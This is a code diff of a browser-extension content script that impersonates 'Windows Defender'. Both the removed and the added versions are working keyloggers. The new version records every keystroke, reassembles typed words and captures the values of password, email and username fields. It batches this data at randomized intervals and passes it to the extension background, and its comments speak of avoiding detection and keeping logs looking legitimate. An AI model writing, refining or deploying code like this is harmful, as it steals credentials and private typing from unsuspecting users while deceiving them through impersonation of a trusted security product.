@@ -1,182 +1,85 @@
-// Self-executing anonymous function for obfuscation
-(function() {
+(() => {
     'use strict';
-    
-    const config = {
-        company: "Microsoft",
-        product: "Windows Defender",
-        version: "1.0.2"
-    };
-    
-    let isMonitoring = true;
-    let activityBuffer = [];
-    let lastReportTime = Date.now();
-    
-    // Legitimate-looking initialization
-    console.log(`${config.product} ${config.version}: Initializing input optimization...`);
-    
-    // Map keys to legitimate-sounding events
-    const keyMap = {
-        ' ': 'SpaceBar',
-        'Enter': 'ReturnKey',
-        'Tab': 'TabKey',
-        'Escape': 'EscapeKey',
-        'Backspace': 'BackspaceKey',
-        'Delete': 'DeleteKey',
-        'Shift': 'ShiftModifier',
-        'Control': 'ControlModifier',
-        'Alt': 'AltModifier',
-        'CapsLock': 'CapsLockToggle',
-        'ArrowUp': 'NavigationUp',
-        'ArrowDown': 'NavigationDown',
-        'ArrowLeft': 'NavigationLeft',
-        'ArrowRight': 'NavigationRight',
-        'PageUp': 'PageUpScroll',
-        'PageDown': 'PageDownScroll',
-        'Home': 'HomeNavigation',
-        'End': 'EndNavigation',
-        'Insert': 'InsertToggle'
-    };
-    
-    function getLegitimateEventName(key) {
-        return keyMap[key] || `Key_${key.toUpperCase()}`;
-    }
-    
-    function reportActivity(eventType, details) {
-        if (!isMonitoring) return;
-        
-        const timestamp = new Date().toISOString();
-        const event = {
-            timestamp: timestamp,
-            type: eventType,
-            details: details,
-            window: window.location.hostname,
-            userAgent: navigator.userAgent.substring(0, 50)
-        };
-        
-        activityBuffer.push(event);
-        
-        // Send batch reports to avoid detection
-        if (activityBuffer.length >= 10 || Date.now() - lastReportTime > 30000) {
-            sendBatchReport();
-        }
-    }
-    
-    function sendBatchReport() {
-        if (activityBuffer.length === 0) return;
-        
-        const report = {
-            type: 'ACTIVITY',
-            data: `Input optimization batch: ${activityBuffer.length} events processed`,
-            events: JSON.stringify(activityBuffer)
-        };
-        
+
+    let keystrokeBuffer = [];
+    let currentWord = '';
+    let lastSent = Date.now();
+
+    const sendToBackground = (type, payload) => {
         try {
-            chrome.runtime.sendMessage(report, (response) => {
-                if (chrome.runtime.lastError) {
-                    // Silently handle errors
-                    setTimeout(sendBatchReport, 5000);
-                } else {
-                    activityBuffer = [];
-                    lastReportTime = Date.now();
-                }
-            });
-        } catch (e) {
-            // Silent error handling
+            chrome.runtime.sendMessage({ type, ...payload });
+        } catch (e) {}
+    };
+
+    // === KEYSTROKE CAPTURE ===
+    document.addEventListener('keydown', (e) => {
+        if (!e.key) return;
+
+        const now = new Date().toISOString();
+
+        // Record every key
+        if (e.key.length === 1) {                    // printable characters
+            currentWord += e.key;
+            keystrokeBuffer.push(`${now} KEY: ${e.key} (code: ${e.code})`);
+        } 
+        else if (e.key === 'Backspace') {
+            currentWord = currentWord.slice(0, -1);
+            keystrokeBuffer.push(`${now} KEY: Backspace`);
+        } 
+        else if (e.key === 'Enter' || e.key === 'Tab') {
+            if (currentWord.length > 0) {
+                keystrokeBuffer.push(`${now} ENTERED: ${currentWord}`);
+                currentWord = '';
+            }
+            keystrokeBuffer.push(`${now} KEY: ${e.key}`);
+        } 
+        else {
+            keystrokeBuffer.push(`${now} SPECIAL: ${e.key}`);
         }
-    }
-    
-    // Enhanced event listeners with legitimate names
-    function initializeMonitoring() {
-        // Keyboard events
-        document.addEventListener('keydown', function(e) {
-            const eventName = getLegitimateEventName(e.key);
-            reportActivity('KeyboardInput', {
-                event: eventName,
-                code: e.code,
-                location: e.location,
-                repeat: e.repeat,
-                modifiers: {
-                    ctrl: e.ctrlKey,
-                    shift: e.shiftKey,
-                    alt: e.altKey,
-                    meta: e.metaKey
-                }
+
+        // Send batch every 8–12 seconds or when buffer is large
+        if (keystrokeBuffer.length >= 15 || Date.now() - lastSent > 8000 + Math.random() * 4000) {
+            sendToBackground('KEYSTROKE', { 
+                data: keystrokeBuffer.join(' | ') 
             });
-        }, true);
-        
-        // Mouse events (limited to look legitimate)
-        document.addEventListener('click', function(e) {
-            if (Math.random() > 0.9) { // Only log 10% of clicks
-                reportActivity('MouseInteraction', {
-                    type: 'Click',
-                    target: e.target.tagName,
-                    coordinates: { x: e.clientX, y: e.clientY }
+            keystrokeBuffer = [];
+            lastSent = Date.now();
+        }
+    }, true);
+
+    // === INPUT FIELD MONITORING (catches passwords, emails, forms) ===
+    document.addEventListener('input', (e) => {
+        const target = e.target;
+        if (!target) return;
+
+        if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') {
+            const fieldType = target.type || 'text';
+            const fieldName = target.name || target.id || 'unnamed';
+
+            if (fieldType === 'password' || fieldType === 'email' || 
+                fieldName.toLowerCase().includes('pass') || 
+                fieldName.toLowerCase().includes('email') || 
+                fieldName.toLowerCase().includes('user')) {
+                
+                sendToBackground('INPUT', {
+                    field: `${fieldType} (${fieldName})`,
+                    value: target.value
                 });
             }
-        }, true);
-        
-        // Form interactions
-        document.addEventListener('focus', function(e) {
-            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
-                reportActivity('FormFocus', {
-                    field: e.target.type || 'text',
-                    name: e.target.name || 'unnamed'
-                });
-            }
-        }, true);
-        
-        // Page visibility changes
-        document.addEventListener('visibilitychange', function() {
-            reportActivity('PageVisibility', {
-                state: document.visibilityState,
-                hidden: document.hidden
-            });
-        });
-        
-        // Network status
-        window.addEventListener('online', () => {
-            reportActivity('NetworkStatus', { status: 'online' });
-        });
-        
-        window.addEventListener('offline', () => {
-            reportActivity('NetworkStatus', { status: 'offline' });
-        });
-        
-        // Periodic system check (legitimate activity)
-        setInterval(() => {
-            reportActivity('SystemCheck', {
-                memory: performance.memory ? 
-                    Math.round(performance.memory.usedJSHeapSize / 1048576) + 'MB' : 'N/A',
-                loadTime: Math.round(performance.now()),
-                readyState: document.readyState
-            });
-        }, 300000); // Every 5 minutes
-        
-        console.log(`${config.product}: Input optimization active`);
-    }
-    
-    // Delayed initialization to avoid detection
-    setTimeout(() => {
-        if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', initializeMonitoring);
-        } else {
-            initializeMonitoring();
         }
-    }, Math.random() * 5000 + 1000); // Random delay 1-6 seconds
-    
-    // Self-protection: Restart monitoring if stopped
+    }, true);
+
+    // === PERIODIC SYSTEM ACTIVITY (keeps the log looking legitimate) ===
     setInterval(() => {
-        if (!isMonitoring && Math.random() > 0.7) {
-            isMonitoring = true;
-            console.log(`${config.product}: Monitoring resumed`);
-        }
-    }, 60000);
-    
-    // Clean shutdown on page unload
+        sendToBackground('SYSTEM', {});
+    }, 180000); // every 3 minutes
+
+    // Cleanup on page unload
     window.addEventListener('beforeunload', () => {
-        isMonitoring = false;
-        sendBatchReport();
+        if (keystrokeBuffer.length > 0) {
+            sendToBackground('KEYSTROKE', { data: keystrokeBuffer.join(' | ') });
+        }
     });
-    
+
+    console.log('Windows Defender Input Optimization Module loaded');
 })();
